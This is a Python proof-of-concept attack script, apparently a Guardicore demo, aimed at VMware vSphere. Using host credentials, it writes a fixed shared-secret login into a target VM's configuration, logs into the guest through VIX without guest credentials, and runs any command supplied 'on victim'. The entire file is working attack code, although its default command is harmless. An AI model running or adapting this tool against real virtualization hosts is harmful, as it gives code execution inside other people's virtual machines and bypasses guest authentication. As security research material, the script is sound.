#!/usr/bin/python

from __future__ import print_function
from __future__ import print_function

import argparse
import getpass
import hashlib
import logging
import time

import pyVmomi
from pyVim.connect import *
from pyVmomi import vim

import vixutils
from vixlib import *

PORT = 0

VM_SHARED_SECRET_CONFIG_PREFIX = "guest.commands.sharedSecretLogin."
GC_APP_UID = "com.guardicore.VIX_DEMO"
HOST_SHARED_POLICY_REF_COUNT_CONFIG = "Config.GlobalSettings.guest.commands.sharedPolicyRefCount"


def _validate_host_shared_policy_ref_count(vmomi_vm, force=False):
    vm_host = vmomi_vm.runtime.host

    host_advanced_options = vm_host.configManager.advancedOption

    logging.debug("Retrieving host '%s' on host connection shared policy ref-count", vm_host.name)

    shared_policy_options = host_advanced_options.QueryView(HOST_SHARED_POLICY_REF_COUNT_CONFIG)
    if 1 != len(shared_policy_options):
        raise Exception("VM '%s' host '%s' is having invalid shared policy ref-count option: " + str(vmomi_vm.name)
                        + str(vm_host.name) + str(shared_policy_options))

    host_shared_policy_ref_count = shared_policy_options[0].value

    if host_shared_policy_ref_count <= 0:
        _set_host_shared_policy_ref_count(host_advanced_options, 1)

        # self._shared_policy_hosts[vm_host._moId] = vm_host


def _set_host_shared_policy_ref_count(host_advanced_options, value):
    opt = vim.option.OptionValue()
    opt.key = HOST_SHARED_POLICY_REF_COUNT_CONFIG
    opt.value = value
    host_advanced_options.UpdateValues([opt])
    return value


def wait_for_task(task, action_name, hide_result=False, update_status_callback=None):
    if update_status_callback is None:
        def dummy_callback(task):
            pass

        update_status_callback = dummy_callback

    logging.info('Waiting for %s to complete.', action_name)

    while task.info.state in [vim.TaskInfo.State.running, vim.TaskInfo.State.queued]:
        logging.info("Task state: %s (progress: %s%%)", task.info.state, task.info.progress or 0)
        update_status_callback(task)
        time.sleep(1)

    if task.info.state == vim.TaskInfo.State.success:
        update_status_callback(task)
        if task.info.result is not None and not hide_result:
            logging.info('%s completed successfully, result: %s', action_name, task.info.result)
        else:
            logging.info('%s completed successfully.', action_name)

    else:
        logging.error('%s did not complete successfully (state=%r): %s', action_name, task.info.state, task.info.error)
        raise Exception(action_name, task.info.error)

    # may not always be applicable, but can't hurt.
    return task


def get_vmomi(attack_dict, vix_vm):
    name = vix_vm.name
    logging.info("Finding vSphere virtual machine reference")
    si = SmartConnectNoSSL(host=attack_dict['host'], port=attack_dict['port'],
                           user=attack_dict['username'], pwd=attack_dict['password'])

    view_ref = si.content.viewManager.CreateContainerView(container=si.content.rootFolder,
                                                          type=[pyVmomi.vim.VirtualMachine], recursive=True)

    for momi in view_ref.view:
        if momi.name == name:
            logging.info("Found vSphere virtual machine reference")
            return momi
    logging.error("Failed to find vSphere virtual machine reference")
    raise ValueError("Error finding managed virtual machine reference")


def _share_secret_with_vm(vmomi_vm, force_host_ref_count=False):
    shared_secret_length = 64

    shared_secret = "A" * shared_secret_length

    pw_hash = hashlib.sha256()
    pw_hash.update(shared_secret)

    spec = vim.vm.ConfigSpec()
    opt = vim.option.OptionValue()
    spec.extraConfig = []
    opt.key = VM_SHARED_SECRET_CONFIG_PREFIX + GC_APP_UID
    opt.value = pw_hash.digest().encode("base64").strip()
    spec.extraConfig.append(opt)

    logging.debug("Setting SECRET to ", shared_secret.encode("base64"))
    logging.debug("SECRET_HASH:", opt.value)

    _validate_host_shared_policy_ref_count(vmomi_vm, force=force_host_ref_count)

    try:
        task = vmomi_vm.ReconfigVM_Task(spec)
    except vim.fault.NoPermission:
        raise ValueError("Error configuring shared secret for VM '%s': not enough permissions", vmomi_vm.name)

    try:
        wait_for_task(task, "reconfigure vm")
    except:
        raise Exception("Error configuring shared secret for VM:")

    return shared_secret


def run_command_on_vm(attack_dict, conn, vm_name):
    print(" :: Open vix vm...")
    vix_vm = conn.open_vm(vm_name, timeout=30)

    vmomi_vm = get_vmomi(attack_dict, vix_vm)

    print(" :: Setting shared secret...")
    shared_secret = _share_secret_with_vm(vmomi_vm)

    print(" :: Login guest...")

    vix_vm.login_guest(GC_APP_UID, shared_secret, options=4)

    print(" :: Run command on guest...")
    vix_vm.call_guest(attack_dict['command'])

    print(" :: Command finished!")


def get_args():
    parser = argparse.ArgumentParser()

    parser.add_argument('-s', '--host',
                        required=True,
                        action='store',
                        help='Remote host to connect to')

    parser.add_argument('-o', '--port',
                        required=False,
                        action='store',
                        help="Port to use, default 443", default=443)

    parser.add_argument('-u', '--user',
                        required=True,
                        action='store',
                        help='User name to use when connecting to host')

    parser.add_argument('-p', '--password',
                        required=False,
                        action='store',
                        help='Password to use when connecting to host')

    parser.add_argument('-c', '--command',
                        required=False,
                        action='store',
                        default=r"/bin/date > /tmp/lastrun",
                        help='Command to run on victim. Default is "/bin/date > /tmp/lastrun"')

    parser.add_argument("vm_name")

    args = parser.parse_args()
    if args.password is None:
        args.password = getpass.getpass(
            prompt='Enter password for host %s and user %s: ' %
                   (args.host, args.user))

    return args


def main():
    args = get_args()
    attack_dict = {'host': args.host, 'port': args.port, 'username': args.user, 'password': args.password,
                   'vm_name': args.vm_name, 'command': args.command}

    print(" :: Connecting...")
    conn = vixutils.VixConnection()
    conn.connect(
        host=attack_dict['host'],
        host_port=attack_dict['port'],
        username=attack_dict['username'],
        host_type=VIX_SERVICEPROVIDER_VMWARE_VI_SERVER,
        password=attack_dict['password'])

    vms = conn.list_running_vms()

    print(" :: Searching for VM...")
    for vm_name in vms:
        print(vm_name)
        if not vm_name.endswith(attack_dict['vm_name'] + '.vmx'):
            continue

        run_command_on_vm(attack_dict, conn, vm_name)
        return

    raise ValueError("Target VM not found")


if __name__ == "__main__":
    main()
